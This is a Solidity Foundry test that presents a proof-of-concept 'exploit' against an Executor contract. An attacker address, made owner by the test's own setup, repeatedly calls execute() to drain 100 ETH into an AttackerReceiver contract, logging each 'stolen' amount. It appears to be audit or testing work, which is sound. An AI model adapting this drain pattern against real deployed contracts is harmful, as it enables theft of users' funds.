// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {Executor} from "contracts/Executor.sol";

contract AttackerReceiver {
    event FallbackTriggered(address sender, uint256 value);
    event MaliciousCalled(address sender, uint256 value, bytes data);

    receive() external payable {
        emit FallbackTriggered(msg.sender, msg.value);
        console.log("[AttackerReceiver] receive() - sender:", msg.sender, "value:", msg.value);
    }

    function maliciousLogic() external payable {
        emit MaliciousCalled(msg.sender, msg.value, msg.data);
        console.log("[AttackerReceiver] maliciousLogic() - sender:", msg.sender, "value:", msg.value);
    }
}

contract ExecutorExploitTest is Test {
    Executor private executor;
    address private deployer;
    address private attacker;
    AttackerReceiver private attackerContract;

    function setUp() public {
        deployer = address(this);
        attacker = vm.addr(1337);

        executor = new Executor(deployer);
        attackerContract = new AttackerReceiver();

        executor.transferOwnership(attacker);
        assertEq(executor.owner(), attacker, "Ownership transfer failed");
    }

    function testExploit_StealETHIteratively() public {
        uint256 initialBalance = 100 ether;
        vm.deal(address(executor), initialBalance);
        console.log("[Setup] Funded Executor with", initialBalance / 1e18, "ETH");
        assertEq(address(executor).balance, initialBalance, "Initial funding failed");

        vm.startPrank(attacker);
        console.log("[Exploit Start] Attacker:", attacker);

        bytes memory emptyPayload;
        uint256 stealPerCall = 10 ether;
        uint256 stolenTotal = 0;

        for (uint256 i = 0; i < 10; i++) {
            console.log("\n[Exploit Iteration]", i + 1);

            uint256 executorBefore = address(executor).balance;
            uint256 attackerBefore = address(attackerContract).balance;

            console.log("- Executor balance before:", executorBefore / 1e18, "ETH");
            console.log("- AttackerContract balance before:", attackerBefore / 1e18, "ETH");

            executor.execute(address(attackerContract), stealPerCall, emptyPayload);

            uint256 executorAfter = address(executor).balance;
            uint256 attackerAfter = address(attackerContract).balance;

            uint256 stolenThisRound = attackerAfter - attackerBefore;
            stolenTotal += stolenThisRound;

            console.log("- Executed transfer:", stolenThisRound / 1e18, "ETH");
            console.log("- Executor balance after:", executorAfter / 1e18, "ETH");
            console.log("- AttackerContract balance after:", attackerAfter / 1e18, "ETH");
        }

        console.log("\n[Exploit Finished]");
        console.log("- Total stolen:", stolenTotal / 1e18, "ETH");
        console.log("- Final Executor balance:", address(executor).balance / 1e18, "ETH");
        console.log("- Final AttackerContract balance:", address(attackerContract).balance / 1e18, "ETH");

        assertEq(address(attackerContract).balance, 100 ether);
        assertEq(address(executor).balance, 0 ether);

        vm.stopPrank();
    }

    receive() external payable {}
}
